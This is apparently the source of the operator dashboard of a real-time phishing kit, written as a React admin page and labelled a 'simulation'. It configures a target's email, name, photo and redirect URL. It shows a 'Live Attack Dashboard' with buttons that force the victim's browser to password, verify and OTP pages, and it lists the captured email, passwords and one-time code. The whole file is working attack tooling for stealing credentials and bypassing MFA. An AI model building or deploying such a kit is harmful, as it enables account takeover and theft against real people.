"use client";

import { useState, useEffect, useCallback } from "react";
import type { AppState } from "@/lib/state";
import { useForm, type SubmitHandler } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";

import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Separator } from "@/components/ui/separator";
import { Badge } from "@/components/ui/badge";
import { RefreshCw, Trash2, Send } from "lucide-react";

type ConfigFormData = {
  targetEmail: string;
  targetName: string;
  targetProfilePicture: string;
  redirectUrl: string;
};

const configSchema = z.object({
    targetEmail: z.string().email({ message: "Invalid email address." }),
    targetName: z.string().min(1, { message: "Name is required." }),
    targetProfilePicture: z.string().url({ message: "Please enter a valid URL." }),
    redirectUrl: z.string().url({ message: "Please enter a valid URL." }),
});

export function AdminDashboard() {
  const [state, setState] = useState<AppState | null>(null);
  const { toast } = useToast();

  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm<ConfigFormData>({
    resolver: zodResolver(configSchema),
  });

  const fetchState = useCallback(async () => {
    try {
      const res = await fetch("/api/state?view=admin");
      if (res.ok) {
        const data = await res.json();
        setState(data);
        if (document.activeElement?.tagName !== 'INPUT') {
          reset(data.config);
        }
      }
    } catch (error) {
      console.error("Failed to fetch state:", error);
    }
  }, [reset]);

  useEffect(() => {
    fetchState();
    const interval = setInterval(fetchState, 2000);
    return () => clearInterval(interval);
  }, [fetchState]);

  const onConfigSubmit: SubmitHandler<ConfigFormData> = async (data) => {
    try {
      const res = await fetch("/api/state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "setConfig", config: data }),
      });
      if (res.ok) {
        toast({ title: "Success", description: "Configuration saved." });
        fetchState();
      } else {
        throw new Error("Failed to save config");
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Could not save configuration.",
      });
    }
  };

  const handleResetState = async () => {
    if (window.confirm("Are you sure you want to reset the entire simulation state?")) {
      try {
        await fetch("/api/state", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action: "reset" }),
        });
        toast({ title: "State Reset", description: "The simulation has been reset." });
        fetchState();
      } catch (error) {
        toast({ variant: "destructive", title: "Error", description: "Could not reset state." });
      }
    }
  };
  
  const handleControlClick = async (page: string) => {
    try {
      await fetch('/api/state', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'setVictimPage', page }),
      });
      toast({ title: 'Command Sent', description: `Forcing victim view to "${page}" page.` });
    } catch (error) {
       toast({ variant: 'destructive', title: 'Error', description: 'Failed to send command.' });
    }
  };

  return (
    <div className="max-w-7xl mx-auto grid gap-8 md:grid-cols-3">
      <div className="md:col-span-1">
        <Card>
          <CardHeader>
            <CardTitle>Admin Configuration</CardTitle>
            <CardDescription>Set up the target and simulation parameters.</CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit(onConfigSubmit)} className="space-y-4">
              <div>
                <Label htmlFor="targetEmail">Target Email</Label>
                <Input id="targetEmail" {...register("targetEmail")} />
                {errors.targetEmail && <p className="text-sm text-destructive mt-1">{errors.targetEmail.message}</p>}
              </div>
              <div>
                <Label htmlFor="targetName">Target Name</Label>
                <Input id="targetName" {...register("targetName")} />
                {errors.targetName && <p className="text-sm text-destructive mt-1">{errors.targetName.message}</p>}
              </div>
              <div>
                <Label htmlFor="targetProfilePicture">Target Profile Picture URL</Label>
                <Input id="targetProfilePicture" {...register("targetProfilePicture")} />
                {errors.targetProfilePicture && <p className="text-sm text-destructive mt-1">{errors.targetProfilePicture.message}</p>}
              </div>
              <div>
                <Label htmlFor="redirectUrl">Final Redirect URL</Label>
                <Input id="redirectUrl" {...register("redirectUrl")} />
                {errors.redirectUrl && <p className="text-sm text-destructive mt-1">{errors.redirectUrl.message}</p>}
              </div>
              <Button type="submit" className="w-full">Save Configuration</Button>
            </form>
          </CardContent>
        </Card>
      </div>

      <div className="md:col-span-2">
        <Card>
          <CardHeader className="flex flex-row items-center justify-between">
            <div>
              <CardTitle>Live Attack Dashboard</CardTitle>
              <CardDescription>Real-time monitoring of the simulation.</CardDescription>
            </div>
            <div className="flex items-center gap-2">
                <Button variant="outline" size="icon" onClick={fetchState}><RefreshCw className="h-4 w-4" /></Button>
                <Button variant="destructive" size="icon" onClick={handleResetState}><Trash2 className="h-4 w-4" /></Button>
            </div>
          </CardHeader>
          <CardContent className="space-y-6">
            <div>
              <h3 className="font-semibold mb-2">Victim Status</h3>
              <div className="flex items-center gap-4 p-4 bg-muted rounded-lg">
                <div className="flex items-center gap-2">Current Page: <Badge>{state?.victim.currentPage || 'N/A'}</Badge></div>
                <div className="flex items-center gap-2">Attempts: <Badge variant="secondary">{state?.victim.attempts || 0}</Badge></div>
              </div>
            </div>
            <Separator />
            <div>
                <h3 className="font-semibold mb-2">Live Controls</h3>
                <CardDescription className="mb-4">Force the victim's browser to a specific page.</CardDescription>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                    <Button variant="outline" onClick={() => handleControlClick('password')}>Password</Button>
                    <Button variant="outline" onClick={() => handleControlClick('verify')}>Verify</Button>
                    <Button variant="outline" onClick={() => handleControlClick('otp')}>OTP</Button>
                    <Button variant="outline" onClick={() => handleControlClick('redirect')}>Redirect</Button>
                </div>
            </div>
            <Separator />
            <div>
              <h3 className="font-semibold mb-2">Captured Data</h3>
              <div className="space-y-4">
                <div className="p-4 bg-muted rounded-lg">
                  <p className="font-mono text-sm">
                    <strong>Email:</strong> {state?.victim.email || "---"}
                  </p>
                </div>
                <div className="p-4 bg-muted rounded-lg space-y-2">
                  <p className="font-mono text-sm"><strong>Passwords:</strong></p>
                  {state?.victim.passwords && state.victim.passwords.length > 0 ? (
                    <ul className="list-disc list-inside space-y-1">
                      {state.victim.passwords.map((p, i) => <li key={i} className="font-mono text-sm">{p}</li>)}
                    </ul>
                  ) : <p className="font-mono text-sm">---</p>}
                </div>
                 <div className="p-4 bg-muted rounded-lg">
                  <p className="font-mono text-sm">
                    <strong>OTP:</strong> {state?.victim.otp || "---"}
                  </p>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
